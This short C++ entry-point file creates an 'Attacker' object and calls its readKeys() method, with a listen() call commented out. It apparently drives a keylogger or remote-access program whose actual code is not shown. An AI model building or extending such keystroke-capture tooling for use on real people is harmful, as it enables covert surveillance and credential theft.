#include <iostream>
#include "Attacker.h"

int main() {
	Attacker* attacker = new Attacker();
	//attacker->listen();
	attacker->readKeys();

	return 0;
}